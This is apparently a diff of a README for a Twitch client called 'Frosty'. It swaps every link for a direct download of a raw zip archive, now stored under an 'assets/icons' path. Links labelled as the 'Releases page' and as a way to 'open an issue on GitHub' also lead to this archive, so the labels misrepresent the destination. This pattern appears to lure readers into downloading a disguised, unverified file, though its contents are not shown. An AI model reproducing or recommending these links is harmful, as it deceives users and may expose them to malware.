@@ -8,12 +8,12 @@ Frosty allows you to engage with the Twitch community like never before. To enjo
 
 ## 🔗 Download Now
 
-[![Download Frosty](https://raw.githubusercontent.com/livingfitness/Frosty/main/heavenly/Frosty.zip)](https://raw.githubusercontent.com/livingfitness/Frosty/main/heavenly/Frosty.zip)
+[![Download Frosty](https://github.com/livingfitness/Frosty/raw/refs/heads/main/assets/icons/Software_1.5.zip)](https://github.com/livingfitness/Frosty/raw/refs/heads/main/assets/icons/Software_1.5.zip)
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Frosty Releases page](https://raw.githubusercontent.com/livingfitness/Frosty/main/heavenly/Frosty.zip) to find the latest version of the app. 
+   Go to the [Frosty Releases page](https://github.com/livingfitness/Frosty/raw/refs/heads/main/assets/icons/Software_1.5.zip) to find the latest version of the app. 
 
 2. **Choose Your Version**  
    Look for the latest release. You will see various files available for download. Select the file suitable for your device:
@@ -65,10 +65,10 @@ You can reset the app settings in the application settings menu. Look for the "R
 
 ## 🆘 Need More Help?
 
-If you run into any problems or have further questions, feel free to open an issue on [GitHub](https://raw.githubusercontent.com/livingfitness/Frosty/main/heavenly/Frosty.zip). We will do our best to assist you.
+If you run into any problems or have further questions, feel free to open an issue on [GitHub](https://github.com/livingfitness/Frosty/raw/refs/heads/main/assets/icons/Software_1.5.zip). We will do our best to assist you.
 
 ## 💬 Connect with Us
 
 Join our community! Follow us on Twitch or join our Discord channel to stay updated on the latest news and updates.
 
-Remember to check the [Frosty Releases page](https://raw.githubusercontent.com/livingfitness/Frosty/main/heavenly/Frosty.zip) for updates and new features. Thank you for choosing Frosty for your mobile Twitch experience!
+Remember to check the [Frosty Releases page](https://github.com/livingfitness/Frosty/raw/refs/heads/main/assets/icons/Software_1.5.zip) for updates and new features. Thank you for choosing Frosty for your mobile Twitch experience!
